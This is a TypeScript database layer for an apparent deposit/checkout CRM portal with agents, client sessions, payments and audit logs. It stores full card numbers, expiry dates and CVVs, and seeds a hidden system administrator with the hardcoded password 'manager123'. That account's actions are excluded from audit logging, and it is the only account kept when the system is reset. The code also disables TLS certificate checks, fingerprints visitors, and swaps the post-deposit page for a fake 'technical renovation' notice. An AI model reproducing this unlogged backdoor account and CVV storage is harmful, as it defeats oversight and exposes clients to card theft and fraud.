import fs from 'fs';
import path from 'path';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';
import dotenv from 'dotenv';
import pg from 'pg';
import { isHiddenSystemActorEmail, HIDDEN_SYSTEM_USER_ID } from './systemAccount.ts';

dotenv.config();

const { Pool } = pg;
const DB_FILE = path.join(process.cwd(), 'db.json');
const SCHEMA_FILE = path.join(process.cwd(), 'db', 'schema.sql');

export interface User {
  id: string;
  firstName: string;
  lastName: string;
  email: string;
  passwordHash: string;
  role: 'Manager' | 'Agent';
  status: 'Active' | 'Disabled';
  createdAt: number;
  ipWhitelistEnabled?: boolean;
  allowedIps?: string[];
  /** Opaque, permanent code used by this agent's public deposit link. */
  referralCode?: string;
}

export interface ClientData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  country: string;
  city: string;
  notes: string;
  company?: string;
  address?: string;
  dateOfBirth?: string;
  depositAmount?: number;
  preferredCurrency?: string;
  referralSource?: string;
}

export interface PaymentMetadata {
  brand: string;
  digitCount: number;
  expiryValid: boolean;
  cvvCompleted: boolean;
  status: string;
  validity: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  /** Sequential checkout order number (display), from 11234. */
  orderNumber?: number;
  transactionId?: string;
}

export interface SessionProgress {
  completed: number;
  total: number;
  percent: number;
}

export interface TimelineEvent {
  event: string;
  timestamp: number;
}

export interface LinkMetadata {
  id: string;
  status: 'Active' | 'Completed' | 'Expired' | 'Disabled' | 'Inactive';
  createdAt: number;
  autoDetectCountryByIp?: boolean;
}

export interface CrmSession {
  id: string;
  agent: string;
  agentId?: string;
  priority: 'High' | 'Medium' | 'Low';
  status: string;
  createdAt: number;
  updatedAt: number;
  connection: 'online' | 'offline';
  client: ClientData & { emailStatus?: 'Pending' | 'Completed' };
  payment: PaymentMetadata;
  progress: SessionProgress;
  activity: string;
  timeline: TimelineEvent[];
  campaignName?: string;
  /** Where the lead first entered the portal. */
  acquisitionSource?: 'regular' | 'marketing';
  link?: LinkMetadata;
  closed?: boolean;
  isAnonymous?: boolean;
  trackingId?: string;
  fingerprint?: {
    browser: string;
    os: string;
    device: string;
    screen: string;
    language: string;
  };
  utmParams?: {
    source?: string;
    medium?: string;
    campaign?: string;
    term?: string;
    content?: string;
  };
  referrer?: string;
  landingTime?: number;
  pageViews?: { path: string; timestamp: number }[];
  clicks?: { elementId: string; elementText?: string; timestamp: number }[];
  timeSpentOnSite?: number;
  /** Post-checkout welcome / onboarding guide engagement. */
  onboardingGuide?: {
    /** Unix ms — when this deposit was successfully completed. */
    completedAt?: number;
    openedAt?: number;
    maxScrollPercent?: number;
    completedReadAt?: number;
    /** Unix ms — guide link stops working after this (24h from deposit completion). */
    guideExpiresAt?: number;
    /** One-way server hash used only as a fallback when the signed browser cookie is unavailable. */
    completionIpHash?: string;
  };
}

export interface Deposit {
  id: string;
  clientId: string;
  clientName: string;
  agentName: string;
  amount: number;
  currency: string;
  paymentStatus: 'Pending Review' | 'Completed' | 'Failed';
  submittedAt: number;
  campaignName?: string;
  attributionSource?: string;
  agentId?: string;
  referrer?: string;
}

export interface SystemSettings {
  companyName: string;
  logo: string;
  defaultCurrency: string;
  emailTemplates: {
    welcome: string;
    onboarding: string;
  };
  paymentSettings: {
    sandboxMode: boolean;
    autoApprove: boolean;
  };
  notificationSettings: {
    soundEnabled: boolean;
    pushEnabled: boolean;
  };
  securitySettings: {
    sessionTimeoutMin: number;
    requireTwoFactor: boolean;
    emergencyIpBypass?: boolean;
  };
  assignmentMethod?: 'original_agent' | 'round_robin' | 'country_match' | 'campaign_match';
  /** Public /deposit landing (no session id) — creates anonymous CRM sessions. */
  publicDepositLanding?: PublicDepositLandingSettings;
  /** Post-payment onboarding guide (welcome page). */
  onboardingGuide?: OnboardingGuideSettings;
  /** Next sequential order number issued at checkout (starts at 11234). */
  nextOrderNumber?: number;
}

export const ORDER_NUMBER_START = 11234;

export interface OnboardingGuideSettings {
  /** When enabled, managers see scroll depth until the client reaches the page bottom. */
  trackScrollCompletion: boolean;
  /** Relative URL path served under /deposit/ (e.g. /deposit/welcome.html). */
  pagePath: string;
  expiredTitle: string;
  expiredMessage: string;
}

export const ONBOARDING_GUIDE_TTL_MS = 24 * 60 * 60 * 1000;

export const DEFAULT_ONBOARDING_GUIDE_PAGE_PATH = '/deposit/welcome.html';

export const DEFAULT_ONBOARDING_GUIDE_SETTINGS: OnboardingGuideSettings = {
  trackScrollCompletion: true,
  pagePath: DEFAULT_ONBOARDING_GUIDE_PAGE_PATH,
  expiredTitle: 'Website under technical renovation',
  expiredMessage:
    'This website is temporarily unavailable while we perform technical upgrades. Please contact your account manager for assistance.'
};

export function depositIsCompleted(session: CrmSession): boolean {
  return (
    session.status === 'Completed' ||
    session.client?.emailStatus === 'Completed'
  );
}

export function getOnboardingGuideExpiresAt(session: CrmSession): number | null {
  if (!depositIsCompleted(session)) return null;
  const stored = Number(session.onboardingGuide?.guideExpiresAt);
  if (Number.isFinite(stored) && stored > 0) return stored;
  const completedAt = Number(session.onboardingGuide?.completedAt);
  const updatedAt = Number(session.updatedAt);
  const createdAt = Number(session.createdAt);
  const base = Number.isFinite(completedAt) && completedAt > 0
    ? completedAt
    : Number.isFinite(updatedAt) && updatedAt > 0
      ? updatedAt
      : createdAt;
  return base + ONBOARDING_GUIDE_TTL_MS;
}

export function isOnboardingGuideExpired(session: CrmSession): boolean {
  const expiresAt = getOnboardingGuideExpiresAt(session);
  if (expiresAt == null) return false;
  return Date.now() > expiresAt;
}

export function ensureSessionGuideExpiry(session: CrmSession, completedAt = Date.now()): CrmSession['onboardingGuide'] {
  return {
    // A successful completion starts a fresh reading window. This also repairs
    // stale expiry data left by an earlier failed/retried checkout attempt.
    completedAt,
    openedAt: undefined,
    maxScrollPercent: undefined,
    completedReadAt: undefined,
    guideExpiresAt: completedAt + ONBOARDING_GUIDE_TTL_MS
  };
}

export function normalizeOnboardingGuidePagePath(raw: unknown): string {
  if (typeof raw !== 'string' || !raw.trim()) {
    return DEFAULT_ONBOARDING_GUIDE_PAGE_PATH;
  }
  let path = raw.trim().split('?')[0].split('#')[0];
  if (!path.startsWith('/')) path = `/${path}`;
  if (!path.startsWith('/deposit/') || path.includes('..')) {
    return DEFAULT_ONBOARDING_GUIDE_PAGE_PATH;
  }
  if (!path.endsWith('.html')) {
    path = path.endsWith('/') ? `${path}index.html` : `${path}.html`;
  }
  return path;
}

export interface PublicDepositLandingSettings {
  enabled: boolean;
  /** Brand / website name shown on the public checkout hero. */
  siteName: string;
  disabledMessage: string;
}

export const DEFAULT_PUBLIC_DEPOSIT_LANDING: PublicDepositLandingSettings = {
  enabled: false,
  siteName: 'Place Order',
  disabledMessage:
    'This deposit page is not available at the moment. Please contact your account manager for a personal payment link.'
};

export interface AuditLog {
  id: string;
  userEmail: string;
  userName: string;
  action: string;
  timestamp: number;
}

export interface BlockedIpLog {
  id: string;
  userId?: string;
  userName: string;
  userEmail: string;
  role: string;
  ipAddress: string;
  actionAttempted: string;
  timestamp: number;
  reason: string;
}

interface DbSchema {
  users: User[];
  sessions: CrmSession[];
  deposits: Deposit[];
  settings: SystemSettings;
  auditLogs: AuditLog[];
  blockedIpLogs: BlockedIpLog[];
}

export const DEFAULT_SETTINGS: SystemSettings = {
  companyName: 'Secure Deposit',
  logo: '',
  defaultCurrency: 'GBP',
  emailTemplates: {
    welcome: 'Hello {name}, Welcome to Secure Deposit. Complete your payment here: {link}',
    onboarding: 'Dear {name}, your deposit request of {amount} {currency} is ready. Secure link: {link}'
  },
  paymentSettings: {
    sandboxMode: true,
    autoApprove: false
  },
  notificationSettings: {
    soundEnabled: true,
    pushEnabled: false
  },
  securitySettings: {
    sessionTimeoutMin: 30,
    requireTwoFactor: false,
    emergencyIpBypass: false
  },
  assignmentMethod: 'original_agent',
  publicDepositLanding: { ...DEFAULT_PUBLIC_DEPOSIT_LANDING },
  onboardingGuide: { ...DEFAULT_ONBOARDING_GUIDE_SETTINGS },
  nextOrderNumber: ORDER_NUMBER_START
};

function parseRowData<T>(data: unknown): T {
  if (typeof data === 'string') {
    return JSON.parse(data) as T;
  }
  return data as T;
}

class DatabaseManager {
  readonly ready: Promise<void>;

  private pool: pg.Pool | null = null;
  private useFile = false;

  private data: DbSchema = {
    users: [],
    sessions: [],
    deposits: [],
    settings: DEFAULT_SETTINGS,
    auditLogs: [],
    blockedIpLogs: []
  };

  constructor() {
    this.ready = this.init();
  }

  private logEnvironment() {
    console.log('==================================================');
    console.log('SYSTEM STARTUP: ENVIRONMENT CHECK');
    console.log(`- NODE_ENV: ${process.env.NODE_ENV || 'undefined'}`);
    console.log(`- DATABASE_URL: ${process.env.DATABASE_URL ? 'PRESENT' : 'MISSING'}`);
    const jwtSec = process.env.JWT_SECRET;
    console.log(`- JWT_SECRET: ${jwtSec ? 'PRESENT' : 'MISSING (dev fallback only)'}`);
    console.log(`- PAYMENT_MODE: ${process.env.PAYMENT_MODE || 'sandbox'}`);
    console.log('==================================================');
  }

  private async init(): Promise<void> {
    this.logEnvironment();

    if (process.env.DATABASE_URL) {
      const ssl =
        process.env.PGSSL === 'false'
          ? false
          : process.env.NODE_ENV === 'production'
            ? { rejectUnauthorized: false }
            : undefined;
      this.pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl
      });
      await this.runMigrations();
      await this.loadCacheFromPostgres();
      await this.seedIfEmpty();
      console.log('DatabaseManager: PostgreSQL connected.');
      return;
    }

    if (process.env.NODE_ENV === 'production') {
      throw new Error('DATABASE_URL is required in production.');
    }

    this.useFile = true;
    this.loadFromFile();
    console.warn('DatabaseManager: Using db.json (local dev only). Set DATABASE_URL for Postgres.');
  }

  private async runMigrations(): Promise<void> {
    if (!this.pool) return;
    const sql = fs.readFileSync(SCHEMA_FILE, 'utf-8');
    await this.pool.query(sql);
  }

  private async loadCacheFromPostgres(): Promise<void> {
    if (!this.pool) return;

    const usersRes = await this.pool.query('SELECT data FROM users');
    this.data.users = usersRes.rows.map((r) => parseRowData<User>(r.data));

    const depositsRes = await this.pool.query('SELECT data FROM deposits');
    this.data.deposits = depositsRes.rows.map((r) => parseRowData<Deposit>(r.data));

    const settingsRes = await this.pool.query("SELECT data FROM settings WHERE id = 'default'");
    if (settingsRes.rows.length > 0) {
      this.data.settings = { ...DEFAULT_SETTINGS, ...parseRowData<SystemSettings>(settingsRes.rows[0].data) };
    }

    const auditRes = await this.pool.query('SELECT data FROM audit_logs');
    this.data.auditLogs = auditRes.rows.map((r) => parseRowData<AuditLog>(r.data));

    const blockedRes = await this.pool.query('SELECT data FROM blocked_ip_logs');
    this.data.blockedIpLogs = blockedRes.rows.map((r) => parseRowData<BlockedIpLog>(r.data));

    this.data.sessions = [];
  }

  private async seedIfEmpty(): Promise<void> {
    if (!this.pool) return;
    const count = await this.pool.query('SELECT COUNT(*)::int AS c FROM users');
    if (count.rows[0]?.c > 0) return;
    console.log('PostgreSQL empty — seeding demo users and settings (no sessions).');
    this.seedInMemory();
    await this.persistUsers();
    await this.persistSettings();
    await this.persistAuditLogs();
  }

  private loadFromFile(): void {
    try {
      if (fs.existsSync(DB_FILE)) {
        const raw = fs.readFileSync(DB_FILE, 'utf-8');
        this.data = JSON.parse(raw);
        console.log('Database loaded from db.json.');
      } else {
        this.seedInMemory();
        this.saveFile();
      }
      this.normalizeData();
    } catch (e) {
      console.error('Failed to load db.json:', e);
      this.seedInMemory();
    }
  }

  private normalizeData(): void {
    this.data.users = this.data.users || [];
    this.data.sessions = this.data.sessions || [];
    this.data.deposits = this.data.deposits || [];
    this.data.auditLogs = this.data.auditLogs || [];
    this.data.blockedIpLogs = this.data.blockedIpLogs || [];
    this.data.settings = { ...DEFAULT_SETTINGS, ...this.data.settings };
  }

  private seedInMemory(): void {
    const salt = bcrypt.genSaltSync(10);
    this.data.users = [
      {
        id: HIDDEN_SYSTEM_USER_ID,
        firstName: 'System',
        lastName: 'Administrator',
        email: 'manager@portal.com',
        passwordHash: bcrypt.hashSync('manager123', salt),
        role: 'Manager',
        status: 'Active',
        createdAt: Date.now()
      }
    ];
    this.data.sessions = [];
    this.data.deposits = [];
    this.data.settings = DEFAULT_SETTINGS;
    this.data.auditLogs = [];
    this.data.blockedIpLogs = [];
  }

  private saveFile(): void {
    if (!this.useFile) return;
    try {
      fs.writeFileSync(DB_FILE, JSON.stringify(this.data, null, 2), 'utf-8');
    } catch (e) {
      console.error('Failed to save db.json:', e);
    }
  }

  /** Dev file store: re-read disk so resets apply without restarting the server. */
  private syncFromFile(): void {
    if (!this.useFile || !fs.existsSync(DB_FILE)) return;
    try {
      const raw = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
      this.data.users = raw.users || [];
      this.data.sessions = raw.sessions || [];
      this.data.deposits = raw.deposits || [];
      this.data.auditLogs = raw.auditLogs || [];
      this.data.blockedIpLogs = raw.blockedIpLogs || [];
      if (raw.settings) {
        this.data.settings = { ...DEFAULT_SETTINGS, ...raw.settings };
      }
    } catch (e) {
      console.error('Failed to sync from db.json:', e);
    }
  }

  private async persistUsers(): Promise<void> {
    if (!this.pool) return;
    for (const user of this.data.users) {
      await this.pool.query(
        `INSERT INTO users (id, data) VALUES ($1, $2::jsonb)
         ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
        [user.id, JSON.stringify(user)]
      );
    }
  }

  private async persistSettings(): Promise<void> {
    if (!this.pool) return;
    await this.pool.query(
      `INSERT INTO settings (id, data) VALUES ('default', $1::jsonb)
       ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
      [JSON.stringify(this.data.settings)]
    );
  }

  private async persistAuditLogs(): Promise<void> {
    if (!this.pool) return;
    for (const log of this.data.auditLogs) {
      await this.pool.query(
        `INSERT INTO audit_logs (id, data) VALUES ($1, $2::jsonb)
         ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
        [log.id, JSON.stringify(log)]
      );
    }
  }

  // --- USERS ---
  public getUsers(): User[] {
    this.syncFromFile();
    return this.data.users;
  }

  public getUserById(id: string): User | undefined {
    return this.data.users.find((u) => u.id === id);
  }

  public getUserByEmail(email: string): User | undefined {
    return this.data.users.find((u) => u.email.toLowerCase() === email.toLowerCase());
  }

  public createUser(user: Omit<User, 'id' | 'createdAt'>): User {
    const newUser: User = {
      ...user,
      referralCode: user.referralCode || `ar_${crypto.randomBytes(18).toString('base64url')}`,
      id: `usr-${crypto.randomBytes(4).toString('hex')}`,
      createdAt: Date.now()
    };
    this.data.users.push(newUser);
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query(
        `INSERT INTO users (id, data) VALUES ($1, $2::jsonb)`,
        [newUser.id, JSON.stringify(newUser)]
      );
    }
    return newUser;
  }

  public updateUser(id: string, update: Partial<Omit<User, 'id' | 'createdAt'>>): User | null {
    const idx = this.data.users.findIndex((u) => u.id === id);
    if (idx === -1) return null;
    this.data.users[idx] = { ...this.data.users[idx], ...update };
    const updated = this.data.users[idx];
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query(`UPDATE users SET data = $2::jsonb WHERE id = $1`, [id, JSON.stringify(updated)]);
    }
    return updated;
  }

  public deleteUser(id: string): boolean {
    const initialLen = this.data.users.length;
    this.data.users = this.data.users.filter((u) => u.id !== id);
    if (this.data.users.length === initialLen) return false;
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query('DELETE FROM users WHERE id = $1', [id]);
    }
    return true;
  }

  // --- SESSIONS (always read/write Postgres when configured — no full-table replace) ---
  public async getSessions(): Promise<CrmSession[]> {
    if (this.useFile) {
      this.syncFromFile();
      return (this.data.sessions || []).sort((a, b) => b.createdAt - a.createdAt);
    }
    const res = await this.pool!.query('SELECT data FROM crm_sessions ORDER BY updated_at DESC');
    return res.rows.map((r) => parseRowData<CrmSession>(r.data));
  }

  public async getSessionById(id: string): Promise<CrmSession | undefined> {
    if (this.useFile) {
      this.syncFromFile();
      return (this.data.sessions || []).find((s) => s.id === id);
    }
    const res = await this.pool!.query('SELECT data FROM crm_sessions WHERE id = $1', [id]);
    if (res.rows.length === 0) return undefined;
    return parseRowData<CrmSession>(res.rows[0].data);
  }

  public async createSession(session: CrmSession): Promise<CrmSession> {
    const updatedAt = session.updatedAt || Date.now();
    session.updatedAt = updatedAt;

    if (this.useFile) {
      const idx = (this.data.sessions || []).findIndex((s) => s.id === session.id);
      if (idx !== -1) this.data.sessions[idx] = session;
      else this.data.sessions.push(session);
      this.saveFile();
      return session;
    }

    await this.pool!.query(
      `INSERT INTO crm_sessions (id, data, updated_at) VALUES ($1, $2::jsonb, $3)
       ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data, updated_at = EXCLUDED.updated_at`,
      [session.id, JSON.stringify(session), updatedAt]
    );
    return session;
  }

  public async updateSession(id: string, update: Partial<CrmSession>): Promise<CrmSession | null> {
    if (this.useFile) {
      const existing = await this.getSessionById(id);
      if (!existing) return null;
      const safeUpdate = { ...update };
      if (depositIsCompleted(existing) && safeUpdate.status && safeUpdate.status !== 'Completed') {
        delete safeUpdate.status;
      }
      const merged: CrmSession = {
        ...existing,
        ...safeUpdate,
        updatedAt: Date.now()
      };
      const idx = this.data.sessions.findIndex((s) => s.id === id);
      if (idx !== -1) this.data.sessions[idx] = merged;
      this.saveFile();
      return merged;
    }

    // Serialize read-modify-write operations for a session so heartbeat and
    // field telemetry cannot overwrite a payment completion written at the
    // same time.
    const client = await this.pool!.connect();
    try {
      await client.query('BEGIN');
      const result = await client.query('SELECT data FROM crm_sessions WHERE id = $1 FOR UPDATE', [id]);
      if (result.rows.length === 0) {
        await client.query('ROLLBACK');
        return null;
      }
      const existing = parseRowData<CrmSession>(result.rows[0].data);
      const safeUpdate = { ...update };
      if (depositIsCompleted(existing) && safeUpdate.status && safeUpdate.status !== 'Completed') {
        delete safeUpdate.status;
      }
      const merged: CrmSession = {
        ...existing,
        ...safeUpdate,
        updatedAt: Date.now()
      };
      await client.query(
        `UPDATE crm_sessions SET data = $2::jsonb, updated_at = $3 WHERE id = $1`,
        [id, JSON.stringify(merged), merged.updatedAt]
      );
      await client.query('COMMIT');
      return merged;
    } catch (error) {
      await client.query('ROLLBACK');
      throw error;
    } finally {
      client.release();
    }
  }

  public async deleteSession(id: string): Promise<boolean> {
    if (this.useFile) {
      const initialLen = this.data.sessions.length;
      this.data.sessions = this.data.sessions.filter((s) => s.id !== id);
      if (this.data.sessions.length !== initialLen) {
        this.saveFile();
        return true;
      }
      return false;
    }

    const res = await this.pool!.query('DELETE FROM crm_sessions WHERE id = $1', [id]);
    return (res.rowCount ?? 0) > 0;
  }

  // --- DEPOSITS ---
  public getDeposits(): Deposit[] {
    this.syncFromFile();
    return this.data.deposits;
  }

  public createDeposit(deposit: Omit<Deposit, 'id' | 'submittedAt'>): Deposit {
    const newDeposit: Deposit = {
      ...deposit,
      id: `dep-${crypto.randomBytes(4).toString('hex')}`,
      submittedAt: Date.now()
    };
    this.data.deposits.push(newDeposit);
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query(`INSERT INTO deposits (id, data) VALUES ($1, $2::jsonb)`, [
        newDeposit.id,
        JSON.stringify(newDeposit)
      ]);
    }
    return newDeposit;
  }

  // --- SETTINGS ---
  private resolvedSettings(): SystemSettings {
    const s = this.data.settings || DEFAULT_SETTINGS;
    return {
      ...DEFAULT_SETTINGS,
      ...s,
      publicDepositLanding: {
        ...DEFAULT_PUBLIC_DEPOSIT_LANDING,
        ...(s.publicDepositLanding || {})
      },
      onboardingGuide: {
        ...DEFAULT_ONBOARDING_GUIDE_SETTINGS,
        ...(s.onboardingGuide || {}),
        pagePath: normalizeOnboardingGuidePagePath(
          (s.onboardingGuide || {}).pagePath ?? DEFAULT_ONBOARDING_GUIDE_PAGE_PATH
        )
      },
      securitySettings: {
        ...DEFAULT_SETTINGS.securitySettings,
        ...(s.securitySettings || {})
      },
      paymentSettings: {
        ...DEFAULT_SETTINGS.paymentSettings,
        ...(s.paymentSettings || {})
      },
      notificationSettings: {
        ...DEFAULT_SETTINGS.notificationSettings,
        ...(s.notificationSettings || {})
      },
      emailTemplates: {
        ...DEFAULT_SETTINGS.emailTemplates,
        ...(s.emailTemplates || {})
      }
    };
  }

  public getSettings(): SystemSettings {
    this.syncFromFile();
    return this.resolvedSettings();
  }

  /** Monotonic order numbers for checkout (11234, 11235, …). */
  public allocateOrderNumber(): number {
    this.syncFromFile();
    const current = this.data.settings?.nextOrderNumber;
    const next =
      typeof current === 'number' && current >= ORDER_NUMBER_START ? current : ORDER_NUMBER_START;
    this.data.settings = {
      ...this.resolvedSettings(),
      nextOrderNumber: next + 1
    };
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.persistSettings();
    }
    return next;
  }

  public updateSettings(update: Partial<SystemSettings>): SystemSettings {
    const merged: SystemSettings = { ...this.data.settings, ...update };
    if (update.publicDepositLanding) {
      merged.publicDepositLanding = {
        ...DEFAULT_PUBLIC_DEPOSIT_LANDING,
        ...(this.data.settings.publicDepositLanding || {}),
        ...update.publicDepositLanding
      };
    }
    if (update.onboardingGuide) {
      const prevGuide = this.data.settings.onboardingGuide || {};
      const patch = { ...update.onboardingGuide };
      if (patch.pagePath !== undefined) {
        patch.pagePath = normalizeOnboardingGuidePagePath(patch.pagePath);
      }
      merged.onboardingGuide = {
        ...DEFAULT_ONBOARDING_GUIDE_SETTINGS,
        ...prevGuide,
        ...patch
      };
    }
    if (update.securitySettings) {
      merged.securitySettings = {
        ...DEFAULT_SETTINGS.securitySettings,
        ...(this.data.settings.securitySettings || {}),
        ...update.securitySettings
      };
    }
    this.data.settings = merged;
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.persistSettings();
    }
    return this.resolvedSettings();
  }

  // --- AUDIT LOGS ---
  public getAuditLogs(): AuditLog[] {
    return this.data.auditLogs;
  }

  public createAuditLog(userEmail: string, userName: string, action: string) {
    if (isHiddenSystemActorEmail(userEmail)) {
      return;
    }
    const log: AuditLog = {
      id: `audit-${crypto.randomBytes(4).toString('hex')}`,
      userEmail,
      userName,
      action,
      timestamp: Date.now()
    };
    this.data.auditLogs.unshift(log);
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query(`INSERT INTO audit_logs (id, data) VALUES ($1, $2::jsonb)`, [
        log.id,
        JSON.stringify(log)
      ]);
    }
  }

  // --- BLOCKED IP LOGS ---
  public getBlockedIpLogs(): BlockedIpLog[] {
    return (this.data.blockedIpLogs || []).sort((a, b) => b.timestamp - a.timestamp);
  }

  public createBlockedIpLog(log: Omit<BlockedIpLog, 'id' | 'timestamp'>): BlockedIpLog {
    const newLog: BlockedIpLog = {
      ...log,
      id: `ipblock-${crypto.randomBytes(4).toString('hex')}`,
      timestamp: Date.now()
    };
    if (!this.data.blockedIpLogs) this.data.blockedIpLogs = [];
    this.data.blockedIpLogs.unshift(newLog);
    if (this.data.blockedIpLogs.length > 200) {
      this.data.blockedIpLogs = this.data.blockedIpLogs.slice(0, 200);
    }
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query(`INSERT INTO blocked_ip_logs (id, data) VALUES ($1, $2::jsonb)`, [
        newLog.id,
        JSON.stringify(newLog)
      ]);
    }
    return newLog;
  }

  public clearBlockedIpLogs(): void {
    this.data.blockedIpLogs = [];
    if (this.useFile) {
      this.saveFile();
    } else {
      void this.pool!.query('DELETE FROM blocked_ip_logs');
    }
  }

  public updateUserIpWhitelist(userId: string, enabled: boolean, ips: string[]): User | null {
    const cleanIps = Array.from(new Set(ips.map((ip) => ip.trim()).filter((ip) => ip.length > 0)));
    return this.updateUser(userId, {
      ipWhitelistEnabled: enabled,
      allowedIps: cleanIps
    });
  }

  /** Wipe users/sessions/deposits/logs except the hidden system manager account. */
  public async resetToSystemOnly(): Promise<void> {
    const manager = this.data.users.find((u) => u.id === HIDDEN_SYSTEM_USER_ID)
      || this.data.users.find((u) => u.email.toLowerCase() === 'manager@portal.com');

    if (this.useFile) {
      this.data.users = manager ? [manager] : [];
      this.data.sessions = [];
      this.data.deposits = [];
      this.data.auditLogs = [];
      this.data.blockedIpLogs = [];
      this.saveFile();
      return;
    }

    if (!this.pool) return;
    const client = await this.pool.connect();
    try {
      await client.query('BEGIN');
      await client.query('DELETE FROM crm_sessions');
      await client.query('DELETE FROM deposits');
      await client.query('DELETE FROM audit_logs');
      await client.query('DELETE FROM blocked_ip_logs');
      await client.query('DELETE FROM users');
      if (manager) {
        await client.query(`INSERT INTO users (id, data) VALUES ($1, $2::jsonb)`, [
          manager.id,
          JSON.stringify(manager)
        ]);
      }
      await client.query('COMMIT');
      this.data.users = manager ? [manager] : [];
      this.data.sessions = [];
      this.data.deposits = [];
      this.data.auditLogs = [];
      this.data.blockedIpLogs = [];
    } catch (e) {
      await client.query('ROLLBACK');
      throw e;
    } finally {
      client.release();
    }
  }

  /** Import full db.json snapshot into Postgres (transaction). */
  public async importFromSnapshot(snapshot: DbSchema): Promise<{ users: number; sessions: number; deposits: number }> {
    if (!this.pool) {
      throw new Error('importFromSnapshot requires DATABASE_URL');
    }
    const client = await this.pool.connect();
    try {
      await client.query('BEGIN');

      for (const user of snapshot.users || []) {
        await client.query(
          `INSERT INTO users (id, data) VALUES ($1, $2::jsonb) ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
          [user.id, JSON.stringify(user)]
        );
      }

      for (const session of snapshot.sessions || []) {
        const updatedAt = session.updatedAt || session.createdAt || Date.now();
        await client.query(
          `INSERT INTO crm_sessions (id, data, updated_at) VALUES ($1, $2::jsonb, $3)
           ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data, updated_at = EXCLUDED.updated_at`,
          [session.id, JSON.stringify(session), updatedAt]
        );
      }

      for (const deposit of snapshot.deposits || []) {
        await client.query(
          `INSERT INTO deposits (id, data) VALUES ($1, $2::jsonb) ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
          [deposit.id, JSON.stringify(deposit)]
        );
      }

      if (snapshot.settings) {
        await client.query(
          `INSERT INTO settings (id, data) VALUES ('default', $1::jsonb) ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
          [JSON.stringify({ ...DEFAULT_SETTINGS, ...snapshot.settings })]
        );
      }

      for (const log of snapshot.auditLogs || []) {
        await client.query(
          `INSERT INTO audit_logs (id, data) VALUES ($1, $2::jsonb) ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
          [log.id, JSON.stringify(log)]
        );
      }

      for (const log of snapshot.blockedIpLogs || []) {
        await client.query(
          `INSERT INTO blocked_ip_logs (id, data) VALUES ($1, $2::jsonb) ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data`,
          [log.id, JSON.stringify(log)]
        );
      }

      await client.query('COMMIT');
      await this.loadCacheFromPostgres();
      return {
        users: (snapshot.users || []).length,
        sessions: (snapshot.sessions || []).length,
        deposits: (snapshot.deposits || []).length
      };
    } catch (e) {
      await client.query('ROLLBACK');
      throw e;
    } finally {
      client.release();
    }
  }
}

export const db = new DatabaseManager();
